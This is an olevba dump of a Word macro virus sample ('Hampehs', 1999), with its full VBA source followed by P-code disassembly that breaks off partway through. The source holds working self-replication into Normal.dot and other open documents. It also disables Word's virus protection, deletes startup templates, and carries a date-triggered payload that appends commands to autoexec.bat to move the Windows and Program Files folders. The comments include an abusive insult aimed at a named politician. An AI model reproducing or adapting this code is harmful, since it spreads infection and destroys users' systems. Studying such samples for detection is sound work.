olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Shepmah
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Shepmah - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO hampehs.bas 
in file: ./Virus.MSWord.Shepmah - OLE stream: 'Macros/VBA/hampehs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Hampesh v1.0b
'Release : 12/10/1999

'Dedicated to the biggest PUKIMAK in Malaysia!
'Dato' Seri Dr Mahathir Mohamed

Public Ushar_SB As Variant
Public Dah_Jumpe, Check As Boolean
Public actDoc, SloSlo As Object

Function Go_DingDang()
Dim coprasmi As String
On Error Resume Next

coprasmi = "hampehs"

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

For chett = 1 To 2
If NormalTemplate.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
    ddSrc = ActiveDocument.FullName
    ddDest = NormalTemplate.FullName
    Check = True
    Ushar_SB = NormalTemplate.VBProject.VBComponents.Item(2).Name
        Bunuh_SB ddDest
    Makan_Budak ddSrc, ddDest, coprasmi
End If
    
    If Dah_Jumpe = True Then
        Check = False
        ddDest = actDoc.FullName
        usharAct = actDoc
        Set SloSlo = actDoc
        ddSrc = NormalTemplate.FullName
    Else
        If ActiveDocument.VBProject.VBComponents.Item(coprasmi).Name <> coprasmi Then
            Check = False
            ddSrc = NormalTemplate.FullName
            ddDest = ActiveDocument.FullName
            usharAct = ddDest
            Set SloSlo = ActiveDocument
        Else: akuLerWoi = True
        End If
    End If
        If akuLerWoi = True Then GoTo pusin
            Ushar_SB = actDoc.VBProject.VBComponents.Item(2).Name
            Ushar_Awek = actDoc.VBProject.VBComponents.Item(3).Name
            
            If Ushar_SB = "hampehs" And Ushar_Awek = "DingDang" Then GoTo pusin
                
                Bunuh_SB ddDest
                Makan_Budak ddSrc, ddDest, coprasmi
            orait = True
    
pusin:
coprasmi = "DingDang"
Next chett

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "DingDang Yang Kiyut"
    .Title = "Hampehs! What The Hell Is It?"
    .Subject = "It is other method saying SHIT!"
    .Comments = "This is only a beginning... wait for the worst to come after Hampehs. It will be much more worst! Visit Hampehs at http://hampehs.cjb.net for disinfection!"
    .Keywords = "I Love Shida!!"
    .Execute
End With

If orait = True Then SloSlo.SaveAs FileName:=SloSlo.FullName
End Function
Sub Bunuh_SB(Fail_SB)
    If Ushar_SB = "hampehs" Or Ushar_SB = "" Then GoTo tadak_sb
        Application.OrganizerDelete Fail_SB, Ushar_SB, wdOrganizerObjectProjectItems
tadak_sb:
End Sub
Sub Makan_Budak(Sos, Tuju, Stem)
On Error Resume Next
Set aplikasi = Application
aplikasi.OrganizerCopy Sos, Tuju, Stem, 3
If Check = False Then Set Desc = ActiveDocument Else Set Desc = NormalTemplate
Desc.VBProject.Description = "Hampehs [DD/UTM'99]"

End Sub
Sub AutoClose()
On Error Resume Next
WordBasic.disableautomacros False
Application.EnableCancelKey = wdCancelDisabled

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
ToolsOptionsSave.GlobalDotPrompt = 0

AutoOpen

End Sub
Sub AutoExec()
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled

Kill Application.StartupPath & "\*.dot"

Set actDoc = ActiveDocument

Go_DingDang

If Documents.Count > 1 Then
    Dim bil
    For bil = 1 To Documents.Count
        If Documents(bil).Name <> ActiveDocument.Name Then
        Set actDoc = Documents(bil)
        Dah_Jumpe = True
        Go_DingDang
        End If
    Next
End If
Bunuh_Mahadet
End Sub
Sub FileOpen()
WordBasic.disableautomacros True
'If Dialogs(80).Show <> 0 Then WordBasic.disableautomacros False
AutoOpen
WordBasic.disableautomacros False
End Sub
Sub Bunuh_Mahadet()
On Error Resume Next
masa_membunuh = Now
hari = Day(masa_membunuh)
bulan = Month(masa_membunuh)

If hari = 25 And bulan = 2 Then

If Dir("c:\dingdang.kri") <> "" Then GoTo habihs

If Dir("c:\zalim.det") <> "" Then GoTo habihs

Open "C:\zalim.det" For Output As 1
Print #1, "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
Print #1, "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;)=  /\/\/\/\/\/\/\/\/\/\/\/\/"
Print #1, "Hidup ni memang  HAMPEHS kan? Dah tua-tua kena blajar lagi"
Print #1, "Mahathir  pun  memang  HAMPEHS. Memeningkan  kepala  semua"
Print #1, "Microsoft Word pun HAMPEHS jugak... Sebab ada macros bodoh"
Print #1, "     Tapi hidup tanpa HAMPEHS, ia  tak akan sempurna"
Print #1, "     Oleh itu, sedikit HAMPEHS dari kami kepada anda"
Print #1, "            Semoga hidup ini bertambah ceria!"
Print #1, ""
Print #1, "            HAMPEHS-HAMPEHS kan la diri anda!"
Print #1, "     Kerana nasib  semalam mungkin lebih bahagia...~"
Print #1, "                                               [DD/UTM'99]"
Print #1, "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;(=  /\/\/\/\/\/\/\/\/\/\/\/\/"
Print #1, "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
Close 1
Open "c:\autoexec.bat" For Append As 1
Print #1, "Rem -- Hampehs Wuz HERE! ;)="
Print #1, "echo off"
Print #1, "cls"
Print #1, "move /y progra~1 tempt1 > null"
Print #1, "move /y windows tempt2 > null"
Print #1, "cls"
Print #1, "type c:\zalim.det"
Print #1, "pause > null"
Print #1, "Rem -- The world full of Hampehs!"
Close 1

habihs:


CommandBars("Help").Controls("About Microsoft Word").Caption = "[Hampehs] by Dingdang"
CommandBars("Help").Controls("[Hampehs] by Dingdang").Enabled = False


DingDang.Show



End If
End Sub
Sub ToolsMacro()
On Error Resume Next
End Sub
Sub ViewVBCode()
On Error Resume Next
End Sub







-------------------------------------------------------------------------------
VBA MACRO DingDang.frm 
in file: ./Virus.MSWord.Shepmah - OLE stream: 'Macros/VBA/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 























































































Public mesej As Variant

Private Sub Butang_Click()
Unload Me
End Sub

Public Sub UserForm_Layout()

teks1 = "Hampehs terhasil daripadai masa aku yang terbazir selama seminggu. Juga daripada rasa malas nak study.."
teks2 = "Tengkiu pada CHeTT untuk koleksi lagu-lagu hindustannya terutama lagu lembu. Lagu yang naik beskal pun bes gak!"
teks3 = "Ellow Jack! Hehehhe... setakat mana agaknya keberkesanan Hampehs ni 'ek? Bini apamacam? Sehat? ;)="
teks4 = "Jamal weh.. ada orang talipon! Hehehe.. satu-satunya mamat yang paling kuat skali begayut selaku mahasistua"
teks5 = "Encik Goku yang gila main game. Sorry... sebab folder games dah di dilitt... NOT! Tipu jerr. manaleh dilit.. faverett!"
teks6 = "Kepada semua awek-awek IRC DALnet yang rasa dirinya jambu, salam khas dari KAMI untuk anda!"
teks7 = "[KUASA PERIBADI ADALAH KUASA RAKYAT YANG DIPERKOSA] SALAM REFORMASI UNTUK SEMUA PEJUANG!"

DingDang.Enabled = False
Butang.Enabled = False
Butang.Caption = "TunGGu MesEj AbiHs DuLu!"
mesej = Array(teks1, teks2, teks3, teks4, teks5, teks6, teks7)
i = 0
For i = 0 To 6
PauseTime = 7
    Start = Timer
    Do While Timer < Start + PauseTime
        DoEvents
    Loop
    Msg.Caption = mesej(i)
Next i
DingDang.Enabled = True
Butang.Enabled = True
Butang.Caption = "Hampehs BetOI!!"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Shepmah
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/hampehs - 10555 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000D "Hampesh v1.0b"
' Line #1:
' 	QuoteRem 0x0000 0x0014 "Release : 12/10/1999"
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x002D "Dedicated to the biggest PUKIMAK in Malaysia!"
' Line #4:
' 	QuoteRem 0x0000 0x001E "Dato' Seri Dr Mahathir Mohamed"
' Line #5:
' Line #6:
' 	Dim (Public) 
' 	VarDefn Ushar_SB (As Variant)
' Line #7:
' 	Dim (Public) 
' 	VarDefn Dah_Jumpe
' 	VarDefn Check (As Boolean)
' Line #8:
' 	Dim (Public) 
' 	VarDefn actDoc
' 	VarDefn SloSlo (As Object)
' Line #9:
' Line #10:
' 	FuncDefn (Function Go_DingDang())
' Line #11:
' 	Dim 
' 	VarDefn coprasmi (As String)
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' Line #14:
' 	LitStr 0x0007 "hampehs"
' 	St coprasmi 
' Line #15:
' Line #16:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld ToolsOptionsSave 
' 	MemSt GlobalDotPrompt 
' Line #18:
' Line #19:
' 	StartForVariable 
' 	Ld chett 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #20:
' 	Ld coprasmi 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld coprasmi 
' 	Ne 
' 	IfBlock 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St ddSrc 
' Line #22:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St ddDest 
' Line #23:
' 	LitVarSpecial (True)
' 	St Check 
' Line #24:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Ushar_SB 
' Line #25:
' 	Ld ddDest 
' 	ArgsCall Bunuh_SB 0x0001 
' Line #26:
' 	Ld ddSrc 
' 	Ld ddDest 
' 	Ld coprasmi 
' 	ArgsCall Makan_Budak 0x0003 
' Line #27:
' 	EndIfBlock 
' Line #28:
' Line #29:
' 	Ld Dah_Jumpe 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitVarSpecial (False)
' 	St Check 
' Line #31:
' 	Ld actDoc 
' 	MemLd FullName 
' 	St ddDest 
' Line #32:
' 	Ld actDoc 
' 	St usharAct 
' Line #33:
' 	SetStmt 
' 	Ld actDoc 
' 	Set SloSlo 
' Line #34:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St ddSrc 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	Ld coprasmi 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld coprasmi 
' 	Ne 
' 	IfBlock 
' Line #37:
' 	LitVarSpecial (False)
' 	St Check 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St ddSrc 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St ddDest 
' Line #40:
' 	Ld ddDest 
' 	St usharAct 
' Line #41:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set SloSlo 
' Line #42:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St akuLerWoi 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld akuLerWoi 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo pusin 
' 	EndIf 
' Line #46:
' 	LitDI2 0x0002 
' 	Ld actDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Ushar_SB 
' Line #47:
' 	LitDI2 0x0003 
' 	Ld actDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Ushar_Awek 
' Line #48:
' Line #49:
' 	Ld Ushar_SB 
' 	LitStr 0x0007 "hampehs"
' 	Eq 
' 	Ld Ushar_Awek 
' 	LitStr 0x0008 "DingDang"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo pusin 
' 	EndIf 
' Line #50:
' Line #51:
' 	Ld ddDest 
' 	ArgsCall Bunuh_SB 0x0001 
' Line #52:
' 	Ld ddSrc 
' 	Ld ddDest 
' 	Ld coprasmi 
' 	ArgsCall Makan_Budak 0x0003 
' Line #53:
' 	LitVarSpecial (True)
' 	St orait 
' Line #54:
' Line #55:
' 	Label pusin 
' Line #56:
' 	LitStr 0x0008 "DingDang"
' 	St coprasmi 
' Line #57:
' 	StartForVariable 
' 	Ld chett 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' Line #59:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #60:
' 	LitStr 0x0013 "DingDang Yang Kiyut"
' 	MemStWith Author 
' Line #61:
' 	LitStr 0x001D "Hampehs! What The Hell Is It?"
' 	MemStWith Title 
' Line #62:
' 	LitStr 0x001F "It is other method saying SHIT!"
' 	MemStWith Subject 
' Line #63:
' 	LitStr 0x009B "This is only a beginning... wait for the worst to come after Hampehs. It will be much more worst! Visit Hampehs at http://hampehs.cjb.net for disinfection!"
' 	MemStWith Comments 
' Line #64:
' 	LitStr 0x000E "I Love Shida!!"
' 	MemStWith Keywords 
' Line #65:
' 	ArgsMemCallWith Execute 0x0000 
' Line #66:
' 	EndWith 
' Line #67:
' Line #68:
' 	Ld orait 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld SloSlo 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld SloSlo 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #69:
' 	EndFunc 
' Line #70:
' 	FuncDefn (Sub Bunuh_SB(Fail_SB))
' Line #71:
' 	Ld Ushar_SB 
' 	LitStr 0x0007 "hampehs"
' 	Eq 
' 	Ld Ushar_SB 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo tadak_sb 
' 	EndIf 
' Line #72:
' 	Ld Fail_SB 
' 	Ld Ushar_SB 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #73:
' 	Label tadak_sb 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub Makan_Budak(Sos, Tuju, Stem))
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	SetStmt 
' 	Ld Application 
' 	Set aplikasi 
' Line #78:
' 	Ld Sos 
' 	Ld Tuju 
' 	Ld Stem 
' 	LitDI2 0x0003 
' 	Ld aplikasi 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #79:
' 	Ld Check 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Desc 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Desc 
' 	EndIf 
' Line #80:
' 	LitStr 0x0013 "Hampehs [DD/UTM'99]"
' 	Ld Desc 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub AutoClose())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #86:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #87:
' Line #88:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #89:
' 	LitDI2 0x0000 
' 	Ld ToolsOptionsSave 
' 	MemSt GlobalDotPrompt 
' Line #90:
' Line #91:
' 	ArgsCall AutoOpen 0x0000 
' Line #92:
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub AutoExec())
' Line #95:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #96:
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub AutoOpen())
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #101:
' Line #102:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #103:
' Line #104:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set actDoc 
' Line #105:
' Line #106:
' 	ArgsCall Go_DingDang 0x0000 
' Line #107:
' Line #108:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #109:
' 	Dim 
' 	VarDefn bil
' Line #110:
' 	StartForVariable 
' 	Ld bil 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #111:
' 	Ld bil 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #112:
' 	SetStmt 
' 	Ld bil 
' 	ArgsLd Documents 0x0001 
' 	Set actDoc 
' Line #113:
' 	LitVarSpecial (True)
' 	St Dah_Jumpe 
' Line #114:
' 	ArgsCall Go_DingDang 0x0000 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	StartForVariable 
' 	Next 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	ArgsCall Bunuh_Mahadet 0x0000 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub FileOpen())
' Line #121:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #122:
' 	QuoteRem 0x0000 0x003F "If Dialogs(80).Show <> 0 Then WordBasic.disableautomacros False"
' Line #123:
' 	ArgsCall AutoOpen 0x0000 
' Line #124:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub Bunuh_Mahadet())
' Line #127:
' 	OnError (Resume Next) 
' Line #128:
' 	Ld Now 
' 	St masa_membunuh 
' Line #129:
' 	Ld masa_membunuh 
' 	ArgsLd Day 0x0001 
' 	St hari 
' Line #130:
' 	Ld masa_membunuh 
' 	ArgsLd Month 0x0001 
' 	St bulan 
' Line #131:
' Line #132:
' 	Ld hari 
' 	LitDI2 0x0019 
' 	Eq 
' 	Ld bulan 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #133:
' Line #134:
' 	LitStr 0x000F "c:\dingdang.kri"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo habihs 
' 	EndIf 
' Line #135:
' Line #136:
' 	LitStr 0x000C "c:\zalim.det"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo habihs 
' 	EndIf 
' Line #137:
' Line #138:
' 	LitStr 0x000C "C:\zalim.det"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;)=  /\/\/\/\/\/\/\/\/\/\/\/\/"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "Hidup ni memang  HAMPEHS kan? Dah tua-tua kena blajar lagi"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "Mahathir  pun  memang  HAMPEHS. Memeningkan  kepala  semua"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "Microsoft Word pun HAMPEHS jugak... Sebab ada macros bodoh"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "     Tapi hidup tanpa HAMPEHS, ia  tak akan sempurna"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "     Oleh itu, sedikit HAMPEHS dari kami kepada anda"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "            Semoga hidup ini bertambah ceria!"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "            HAMPEHS-HAMPEHS kan la diri anda!"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "     Kerana nasib  semalam mungkin lebih bahagia...~"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "                                               [DD/UTM'99]"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "/\/\/\/\/\/\/\/\/\/\/\/\/\  ;(=  /\/\/\/\/\/\/\/\/\/\/\/\/"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "===>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<>>>!!HAMPEHS!!<<<===="
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #154:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Append)
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Rem -- Hampehs Wuz HERE! ;)="
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "echo off"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "move /y progra~1 tempt1 > null"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "move /y windows tempt2 > null"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "type c:\zalim.det"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "pause > null"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Rem -- The world full of Hampehs!"
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #165:
' Line #166:
' 	Label habihs 
' Line #167:
' Line #168:
' Line #169:
' 	LitStr 0x0015 "[Hampehs] by Dingdang"
' 	LitStr 0x0014 "About Microsoft Word"
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #170:
' 	LitVarSpecial (False)
' 	LitStr 0x0015 "[Hampehs] by Dingdang"
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #171:
' Line #172:
' Line #173:
' 	Ld DingDang 
' 	ArgsMemCall Show 0x0000 
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	EndSub 
' Line #179:
' 	FuncDefn (Sub ToolsMacro())
' Line #180:
' 	OnError (Resume Next) 
' Line #181:
' 	EndSub 
' Line #182:
' 	FuncDefn (Sub ViewVBCode())
' Line #183:
' 	OnError (Resume Next) 
' Line #184:
' 	EndSub 
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Macros/VBA/DingDang - 4850 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' 	Dim (Public) 
' 	VarDefn mesej (As Variant)
' Line #88:
' Line #89:
' 	FuncDefn (Private Sub Butang_Click())
' Line #90:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #91:
' 	EndSub 
' Line #92:
' Line #93:
' 	FuncDefn (Public Sub UserForm_Layout())
' Line #94:
' Line #95:
' 	LitStr 0x0067 "Hampehs terhasil daripadai masa aku yang terbazir selama seminggu. Juga daripada rasa malas nak study.."
' 	St teks1 
' Line #96:
' 	LitStr 0x006F "Tengkiu pada CHeTT untuk koleksi lagu-lagu hindustannya terutama lagu lembu. Lagu yang naik beskal pun bes gak!"
' 	St teks2 
' Line #97:
' 	LitStr 0x0062 "Ellow Jack! Hehehhe... setakat mana agaknya keberkesanan Hampehs ni 'ek? Bini apamacam? Sehat? ;)="
' 	St teks3 
' Line #98:
' 	LitStr 0x006B "Jamal weh.. ada orang talipon! Hehehe.. satu-satunya mamat yang paling kuat skali begayut selaku mahasistua"
' 	St teks4 
' Line #99:
' 	LitStr 0x0076 "Encik Goku yang gila main game. Sorry... sebab folder games dah di dilitt... NOT! Tipu jerr. manaleh dilit.. faverett!"
' 	St teks5 
' Line #100:
' 	LitStr 0x005B "Kepada semua awek-awek IRC DALnet yang rasa dirinya jambu, salam khas dari KAMI untuk anda!"
' 	St teks6 
' Line #101:
' 	LitStr 0x0058 "[KUASA PERIBADI ADALAH KUASA RAKYAT YANG DIPERKOSA] SALAM REFORMASI UNTUK SEMUA PEJUANG!"
' 	St teks7 
' Line #102:
' Line #103:
' 	LitVarSpecial (False)
' 	Ld DingDang 
' 	MemSt Enabled 
' Line #104:
' 	LitVarSpecial (False)
' 	Ld Butang 
' 	MemSt Enabled 
' Line #105:
' 	LitStr 0x0018 "TunGGu MesEj AbiHs DuLu!"
' 	Ld Butang 
' 	MemSt Caption 
' Line #106:
' 	Ld teks1 
' 	Ld teks2 
' 	Ld teks3 
